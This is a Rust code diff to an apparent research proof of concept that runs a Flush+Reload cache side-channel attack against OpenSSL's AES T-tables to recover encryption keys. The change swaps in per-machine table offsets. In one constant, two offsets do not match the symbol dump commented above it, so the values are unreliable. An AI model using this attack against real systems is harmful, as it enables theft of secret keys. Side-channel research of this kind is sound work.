@@ -447,16 +447,26 @@ const KEY2: [u8; 32] = [
     0x4f, 0x6e, 0x9c, 0x2a, 0x15, 0x5f, 0x5f, 0x0b, 0x25, 0x77, 0x6b, 0x70, 0xcd, 0xe2, 0xf7, 0x80,
 ];
 
+// On cyber cobaye
+// 00000000001cc480 r Te0
+// 00000000001cc080 r Te1
+// 00000000001cbc80 r Te2
+// 00000000001cb880 r Te3
+const TE_CYBER_COBAYE : [isize;4] = [0x1cc480, 0x1cc080, 0x1ccc80, 0x1cc880];
+
+const TE_CITRON_VERT : [isize; 4] = [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140];
+
 fn main() {
     let open_sslpath = Path::new(env!("OPENSSL_DIR")).join("lib/libcrypto.so");
     let mut side_channel = NaiveFlushAndReload::from_threshold(220);
+    let te = TE_CITRON_VERT;
     unsafe {
         attack_t_tables_poc(
             &mut side_channel,
             AESTTableParams {
                 num_encryptions: 1 << 12,
                 key: [0; 32],
-                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                te: te, // adjust me (should be in decreasing order)
                 openssl_path: &open_sslpath,
             },
         )
@@ -467,7 +477,7 @@ fn main() {
             AESTTableParams {
                 num_encryptions: 1 << 12,
                 key: KEY2,
-                te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                te: te,
                 openssl_path: &open_sslpath,
             },
         )
@@ -480,7 +490,7 @@ fn main() {
                 AESTTableParams {
                     num_encryptions: 1 << 12,
                     key: [0; 32],
-                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                    te: te, // adjust me (should be in decreasing order)
                     openssl_path: &open_sslpath,
                 },
             )
@@ -494,7 +504,7 @@ fn main() {
                 AESTTableParams {
                     num_encryptions: 1 << 12,
                     key: KEY2,
-                    te: [0x1b5d40, 0x1b5940, 0x1b5540, 0x1b5140], // adjust me (should be in decreasing order)
+                    te: te, // adjust me (should be in decreasing order)
                     openssl_path: &open_sslpath,
                 },
             )
